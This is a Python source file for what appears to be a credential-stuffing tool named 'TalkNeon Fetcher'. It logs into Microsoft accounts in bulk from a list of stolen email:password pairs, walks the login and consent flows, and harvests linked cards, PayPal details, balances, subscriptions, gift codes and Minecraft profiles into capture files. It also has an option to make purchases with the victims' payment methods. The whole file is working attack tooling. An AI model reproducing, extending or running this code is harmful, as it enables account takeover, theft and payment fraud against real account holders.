import json
import time
import os
import random
import re
import string
import sys
import threading
import urllib.parse
from utils import Headers, clear, screen, getinfo, mcd
from concurrent.futures import ThreadPoolExecutor


import requests
import urllib3
from colorama import Fore, init
from console.utils import set_title
from requests_toolbelt import MultipartEncoder
from k import Purchase 

from keyauth import api
import hashlib
import os
import sys

urllib3.disable_warnings()
capture=False
wscreen = True
Total = len(open("accounts.txt", "r").read().splitlines())
mccap = False
xbox = 0
dead = 0
minecraft = 0
lol = 0
valid = 0
rpm = 0
rpp = 0
bal = 0
codes = 0
start = time.time()
mfa = 0
sfa = 0
hit = 0
refundable = 0
pur = False
totalsb = 0.0
puri = 0
def log(text, *args):
  if wscreen: return
  print(text, *args)
def dosh(s):
    accountXbox = s.get("https://account.xbox.com/", headers=Headers.xboxacc).text

    if "fmHF" in accountXbox:
        xbox_json = {
            "fmHF": accountXbox.split('id="fmHF" action="')[1].split('"')[0],
            "pprid": accountXbox.split('id="pprid" value="')[1].split('"')[0],
            "nap": accountXbox.split('id="NAP" value="')[1].split('"')[0],
            "anon": accountXbox.split('id="ANON" value="')[1].split('"')[0],
            "t": accountXbox.split('id="t" value="')[1].split('"')[0],
        }

        verifyToken = (s.post(xbox_json["fmHF"], timeout=20, headers={"Content-Type": "application/x-www-form-urlencoded"}, data={"pprid": xbox_json["pprid"], "NAP": xbox_json["nap"], "ANON": xbox_json["anon"], "t": xbox_json["t"]}).text.split('name="__RequestVerificationToken" type="hidden" value="')[1].split('"')[0])

        s.post("https://account.xbox.com/en-us/xbox/account/api/v1/accountscreation/CreateXboxLiveAccount", headers=Headers.update(Headers.createxbox, {"Referer": xbox_json["fmHF"], "__RequestVerificationToken": verifyToken}), data={"partnerOptInChoice": "false", "msftOptInChoice": "false", "isChild": "true","returnUrl": "https://www.xbox.com/en-US/?lc=1033",})

    getXbl = s.get("https://account.xbox.com/en-us/auth/getTokensSilently?rp=http://xboxlive.com,http://mp.microsoft.com/,http://gssv.xboxlive.com/,rp://gswp.xboxlive.com/,http://sisu.xboxlive.com/").text

    try:
        rel = getXbl.split('"http://mp.microsoft.com/":{')[1].split("},")[0]
        json_obj = json.loads("{" + rel + "}")
        xbl_auth = "XBL3.0 x=" + json_obj["userHash"] + ";" + json_obj["token"]
        return xbl_auth
    except: return




def getpms(s, mscred):
    global rpp, rpm, bal
    xbl3 = dosh(s)
    getpm = requests.get("https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US&partner=webblends", headers={"authorization": xbl3}).json()
    act = []
    pp=None
    balance = 0.0
    cs = []
    from k import Purchase
    def purchase(*args):
      global puri
      pi = Purchase(*args)._run()
      puri += pi
    if pur:  
        threading.Thread(target=purchase, args=(mscred,)).start()

    for pm in getpm:
        if isinstance(pm, str): continue
        details = pm.get("details", {})
        balance+=details.get("balance", 0.0)
        if (cur:=details.get('currency', "NaN"))!="NaN": cs.append(cur)
        if pm["paymentMethod"]["paymentMethodType"]=="paypal" and pm["status"]=="Active" and pp is None:
            pp = pm
            continue
        if pm["paymentMethod"]["paymentMethodFamily"] == "credit_card" and pm["status"] == "Active":
            act.append(pm)
    pptxt=f"PayPal linked: False\n- Total Account Balance: {balance}\n- Currency: {cs}\n" if not pp else f"PayPal linked: True Balance: {pp['details']['balance']} Status: {pp['status']}\n- Total Account Balance: {balance}\n- Currency: {cs}\n"
    if balance!=0.0:
        bal += 1
        with open("capture/money.txt", "a") as f:
            txt = f"{mscred} | Balance: {balance} | Currency: {cs}"
            f.write(txt+"\n")
    if "True" in pptxt:
        rpp += 1
        with open("capture/paypal.txt", "a") as f:
            f.write(mscred+f" | Email: {pp['details']['email']}\n")        
    return act, pptxt

def getsubs(s):
  while True:
    try:
        response = s.get('https://account.microsoft.com/services?lang=en-US', headers=Headers.payment)
        break
    except request_exceptions:continue
    except Exception as e:
        slog(e,"r")
        return 'lol'
  try: 
      vrf_token = response.text.split('<input name="__RequestVerificationToken" type="hidden" value="')[1].split('"')[0]
  except:
    raise Exception("Failed to get vrf token")

  r = s.get("https://account.microsoft.com/services/api/subscriptions-and-alerts?excludeWindowsStoreInstallOptions=false&excludeLegacySubscriptions=false", headers = Headers.update(Headers.subs, {'Referer': response.url, '__RequestVerificationToken': vrf_token}))
  d = r.json()
  if len(d["active"]) == 0:
    return {}
  subs = {}
  for sub in d["active"]:
    for item in sub["payNow"]["items"]:
      subs[item["name"]] = sub["productRenewal"]["startDateShortString"] if sub["productRenewal"] else "Unknown"
  return subs    

set_title(f"TalkNeon Fetcher | {lol}/{Total} || MC: {minecraft} | Xbox Pass: {xbox} | Bad: {dead}")
request_exceptions = (requests.exceptions.SSLError,requests.exceptions.ProxyError,requests.exceptions.Timeout)
ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
def slog(content, status: str="c") -> None:
    if wscreen: return
    if status=="y":
        colour = Fore.YELLOW
    elif status=="c":
        colour = Fore.CYAN
    elif status=="r":
        colour = Fore.RED
    elif status=="new":
        colour = Fore.LIGHTYELLOW_EX
    sys.stdout.write(
            f"{colour}{content}"
            + "\n"
            + Fore.RESET
        )    
def remove_content(file_path : str, line_to_remove : str):
    with open(file_path, 'r') as file:
        lines = file.readlines()
    lines = [line for line in lines if line.strip() != line_to_remove.strip()]
    with open(file_path, 'w') as file:
        file.writelines(lines)
def fetch(mscred):
 try:
    global lol,xbox,minecraft,dead, valid, codes, refundable

    s = requests.session()
    email, password = mscred.strip().split(":")
    lol+=1
    while True:
        try:
            response = s.get('https://login.live.com/ppsecure/post.srf', headers=Headers.default,timeout=20).text
            break
        except request_exceptions:
            continue
        except Exception as e:
            dead += 1
            slog(str(e), "r")
            return 'lol'
    try:
        ppft = response.split(''''<input type="hidden" name="PPFT" id="i0327" value="''')[1].split('"')[0]
        log_url = response.split(",urlPost:'")[1].split("'")[0]
    except:
        dead += 1
        slog("[-] Unknown Error (Proxies probably banned)")
        return 'lol'
    log_data = f'i13=0&login={email}&loginfmt={email}&type=11&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={password}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={ppft}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1&isSignupPost=0&isRecoveryAttemptPost=0&i19=449894'
    while True:
        try:
            response = s.post(log_url,timeout=20,data=log_data,headers=Headers.login)
            break
        except request_exceptions as e:
            continue
        except Exception as e:
            dead += 1
            slog(e,"r")
            return 'lol'
    if 'https://privacynotice.account.microsoft.com/notice' in response.text:
        privNotifUrl = response.text.split('name="fmHF" id="fmHF" action="')[1].split('"')[0]
        corelationId = response.text.split('name="correlation_id" id="correlation_id" value="')[1].split('"')[0]
        mCode = response.text.split('type="hidden" name="code" id="code" value="')[1].split('"')[0]
        while True:
            try:
                privNotifPage = s.post(privNotifUrl, headers=Headers.update(Headers.privacy, {'path' : privNotifUrl.replace('https://privacynotice.account.microsoft.com','')}), data={'correlation_id':corelationId, 'code':mCode}).text
                break
            except:
                continue
        try:
          m = MultipartEncoder(fields={'AppName': 'ALC',
            'ClientId': privNotifPage.split("ucis.ClientId = '")[1].split("'")[0],
            'ConsentSurface': 'SISU',
            'ConsentType': 'ucsisunotice',
            'correlation_id': corelationId,
            'CountryRegion': privNotifPage.split("ucis.CountryRegion = '")[1].split("'")[0],
            'DeviceId':'' ,
            'EncryptedRequestPayload': privNotifPage.split("ucis.EncryptedRequestPayload = '")[1].split("'")[0]
            ,'FormFactor': 'Desktop',
            'InitVector':privNotifPage.split("ucis.InitVector = '")[1].split("'")[0],
            'Market': privNotifPage.split("ucis.Market = '")[1].split("'")[0],
            'ModelType': 'ucsisunotice',
            'ModelVersion': '1.11',
            'NoticeId': privNotifPage.split("ucis.NoticeId = '")[1].split("'")[0],
            'Platform': 'Web',
            'UserId': privNotifPage.split("ucis.UserId = '")[1].split("'")[0],
            'UserVersion': '1'},boundary='----WebKitFormBoundary' \
                    + ''.join(random.sample(string.ascii_letters + string.digits, 16)))
        except:
            dead += 1
            return 'gaybehavior'
        while True:
            try:
                response = s.post('https://privacynotice.account.microsoft.com/recordnotice', headers=Headers.update(Headers.precord, {'referer': privNotifUrl, 'content-type': m.content_type}), data=m)
                break
            except:
                continue

        while True:
            try:
                response = s.get(urllib.parse.unquote(privNotifUrl.split('notice?ru=')[1]), headers=Headers.notice)
                break
            except:
                continue


    try:
        url_log2 = re.findall("urlPost:'(.+?(?=\'))", response.text)[0]
    except:
        dead +=1
        slog("[-] Invalid microsoft acc!","c")
        remove_content("accounts.txt",mscred)
        return 'lol'
    ppft2 = ppft


    log_data2 = {
        "LoginOptions": "3",
        "type": "28",
        "ctx": "",
        "hpgrequestid": "",
        "PPFT": ppft2,
        "i19": "19130"
    }
    while True:
        try:
            midAuth2 = s.post(url_log2,timeout=20,data=log_data2,headers=Headers.update(Headers.midauth, {'Referer': log_url})).text
            break
        except request_exceptions:
            continue
        except Exception as e:
            print(e)
            dead += 1
            slog(e,"r")
            return 'lol'
    while "fmHF" in midAuth2:
        midAuth2 = {
"fmHF": midAuth2.split('name="fmHF" id="fmHF" action="')[1].split('"')[0],
"pprid": midAuth2.split('type="hidden" name="pprid" id="pprid" value="')[1].split('"')[0],
"nap": midAuth2.split('type="hidden" name="NAP" id="NAP" value="')[1].split('"')[0],
"anon": midAuth2.split('type="hidden" name="ANON" id="ANON" value="')[1].split('"')[0],
"t": midAuth2.split('<input type="hidden" name="t" id="t" value="')[1].split('"')[0]} 
        data = {
    'pprid': midAuth2["fmHF"],
    'NAP': midAuth2['nap'],
    'ANON': midAuth2['anon'],
    't': midAuth2['t'],
}
        loda_lund = midAuth2['fmHF']
        while True:
            try:
                midAuth2 = s.post(loda_lund, data=data, headers=Headers.midauth2).text
                break
            except request_exceptions:
                continue
            except Exception as e:
                print(e)
                dead += 1
                slog(e,"r")
                return 'lol'

    params = {
        'fref': 'home.drawers.payment-options.manage-payment',
        'refd': 'account.microsoft.com'
    }
    while True:
        try:
            response = s.get('https://account.microsoft.com/billing/payments', params=params, headers=Headers.payment)
            break
        except request_exceptions:continue
        except Exception as e:
            dead += 1
            slog(e,"r")
            return 'lol'
    try: 
        vrf_token = response.text.split('<input name="__RequestVerificationToken" type="hidden" value="')[1].split('"')[0]
    except:
        try:
            fuck = response.text.split('<meta name="description" content="')[1].split('"')[0]
            if fuck == "Try again later":
                dead += 1
                log(Fore.LIGHTYELLOW_EX +f"[-] Microsoft Server Down: Please {fuck}")
                return 'exit'
        except:
            dead += 1
            return 'fuck you mother fucker'
    valid += 1      
    if capture:
        def umm(mscr):
            global xbox, rpm
            try:
                pms, pp=getpms(s, mscred)
                if len(pms)!=0:
                  rpm+=1
                  open("cards.txt", "a").write(mscr+"\n")
                txt=f"Found {len(pms)} cards: {mscr.split(':')[0]}\n"+"\n".join(f"- Card: ***{pm['details']['lastFourDigits']} Balance: {pm['details']['balance']} {pm['details']['address']['country']}" for pm in pms)
                log(Fore.BLUE+txt+"\n- "+pp)

            except Exception as e:
                log(f"{Fore.RED}Failed to get xbl authorization: {e}{Fore.RESET}")
            try:
              subs = getsubs(s)
              stxt = f"{Fore.BLUE}Found {len(subs)} Active subs: {mscred.split(':')[0]}\n"
              for k, v in subs.items():
                if 'game pass' in k.lower(): xbox += 1
                stxt += f"- {k} | Active till {v}\n"
                f = open(f"activesubs/{k}.txt", "a")
                f.write(mscred+"\n")
                f.close()
              log(stxt)  
            except Exception as e:
              log(f"{Fore.RED}Failed to get Active Subs: {e}{Fore.RESET}")

        threading.Thread(target=umm, args=(mscred, )).start()
    if capture and mccap:
      def fetch_mc(mscred):
       try:
        global hit, sfa, mfa, totalsb
        data = mcd(mscred)
        if not data: return
        if (e:=data['profile']):
          if e['name'] is None:
            e['name'] = "No Name Set"
          hit+=1
          try:
            addinfo = requests.get(f"https://sky.shiiyu.moe/api/v2/coins/{e['name']}/").json()
          except:
             addinfo = {'error': "Failed to fetch skyblock profile"}
          if 'error' in addinfo:
            prof = addinfo['error']
          else:    
            prof = [{'name': v['cute_name'], 'purse': v['purse'], 'bank': v['bank']} for k, v in addinfo['profiles'].items()]
            for item in prof:
               bank = item['bank']
               purse = item['purse']
               totalsb += (float(bank) + float(purse))
          if data['access'] == 'MFA':
            mfa += 1
          else:
            sfa += 1

          txt = f"{email} | Username: {e['name']} | SkyBlock: {prof}\n"

          open(f"minecraft/{data['access']}.txt", 'a').write(txt)
          log(f"[{data['access']}] {txt}")
       except Exception as e:
          log(f"{Fore.RED}[-] Failed to get minecraft information -> {email} : {e}")
      threading.Thread(target=fetch_mc, args=(mscred,)).start()

    params = {
        'period': 'AllTime',
        'orderTypeFilter': 'All',
        'filterChangeCount': '0',
        'isInD365Orders': True,
        'isPiDetailsRequired': True,
        'timeZoneOffsetMinutes': '-330',
    }
    json_data = s.get("https://account.microsoft.com/billing/orders/list", params=params, headers=Headers.update(Headers.order, {'Referer': response.url, 'Referer': log_url, '__RequestVerificationToken': vrf_token})).json()
    xboxlol = 0
    try:
        total_orders = json_data['orders']
        orders_count = len(total_orders)
        txt=Fore.BLUE + f"[+] Total {orders_count} Orders Found: {email}{Fore.RESET}\n"
        processed_emails = set()
        msacc = False
        for index, order in enumerate(total_orders, start=1):
            date = order['localSubmittedDate']
            for p in order['paymentInstruments']:
              if 'account' in p.get('localName', p.get('id')).lower():
                msacc = True
                break

            for item_index, item in enumerate(order['items'], start=1):
              if msacc and item.get('isRefundEligible', False):
                open('refundable.txt', 'a').write(f"{mscred} | Refundable Price: {item.get('totalListPrice', 0.0)}\n")
                log(f"{Fore.LIGHTGREEN_EX} Found Refundable Item -> {email} | Refundable Price: {item.get('totalListPrice', 0.0)}")
                refundable += 1
              try:
                order_name = item['localTitle']
                order_status = item.get('itemState', "Physical")
                if order_status.lower() not in ["cancelled", "pending", "failed", "giftredeemed", "authorizationfailed", "refunded", "canceled", "giftsent", "chargeback", "physical"]:
                    open(f"specific/{order_name.replace('/', '.')}.txt", 'a').write(mscred+"\n")
                txt+=Fore.CYAN + f"[{index}.{item_index}] Product Name: {order_name}{Fore.RESET}\n"
                txt+=Fore.LIGHTCYAN_EX + f"[{index}.{item_index}] Status: {order_status} | {date}{Fore.RESET}\n"
                if "Game Pass" in order_name:
                    xboxlol += 1

                elif "GiftSent" in order_status:

                    giftcodeother = item.get('giftCode', None)
                    if giftcodeother:
                      codes += 1
                      ipother = order['address']['regionName']
                      open("codes.txt", "a").write(giftcodeother + " : " + ipother + " : " + order_name + "\n")
              except Exception as e:
                log(e)
                continue
        log(txt)
        if orders_count > 0:
            processed_emails.add(mscred)
        for email in processed_emails:
            open("working_mails.txt", "a").write(email + "\n")
    except KeyError as e:
        orders_count = 0
        log(e)
        log(total_orders)
        log("[-] No Orders Found. ")
        pass
    except Exception as e:
        orders_count = 0
        log("[-] An error occurred:", e)
        return 'exit'

    if orders_count == 0:
        open("work0.txt", "a").write(mscred + "\n")
    if not capture and xboxlol > 0:

        xbox += 1
        open("gamepasses.txt", "a").write(mscred+"\n")
    set_title(f"TalkNeon Fetcher | {lol}/{Total} || MC: {minecraft} | Xbox Pass: {xbox} | Bad: {dead}")
    remove_content("accounts.txt", mscred)
 except Exception as e: print(e)

update = True

def update_screen():
  while update:
    screen(Total, valid, dead, lol, rpm, rpp, codes, xbox, bal, start, mccap, mfa, sfa, hit, refundable, totalsb, puri)
    time.sleep(1)

import os
import atexit

def clear():
    os.system("cls" if os.name == "nt" else "clear")

if __name__ == "__main__":
    ask = input("Choose Action: [1] Pull [2] Fetcher [3] Charged (New) [4] Search\n> ")

    if "1" in ask.lower():
        clear()
        os.system("python modulees/puller.py")  # Adjust path to include 'modules'
    elif "3" in ask.lower():
        clear()
        os.system("python modulees/charg.py")  # Adjust path to include 'modules'
    elif "4" in ask.lower():
        clear()
        os.system("python modulees/searcher.py")  # Adjust path to include 'modules'
    else:
        clear()

ask = input("Full capture? y/n\n> ")
if "y" in ask:
    capture = True
    ask = input("Enable purchaser? y/n\n> ")
    if 'y' in ask:
        pur = True
    ask = input("Minecraft Capture? y/n\n> ")
    if 'y' in ask:
        mccap = True

    accounts = open("accounts.txt", "r").read().splitlines()
    threads = int(input(f"{Fore.BLUE}Input Thread amount: "))
    if wscreen:
      threading.Thread(target=update_screen).start()
    @atexit.register
    def exit():
      global lol, dead
      if wscreen:
        if lol!=Total:
          lol = Total
          dead = Total - valid
        screen(Total, valid, dead, lol, rpm, rpp, codes, xbox, bal, start, mccap, mfa, sfa, hit, refundable, totalsb, puri)
    with ThreadPoolExecutor(max_workers=threads) as exc:
        for acc in accounts:
            exc.submit(fetch, acc)

    update = False

      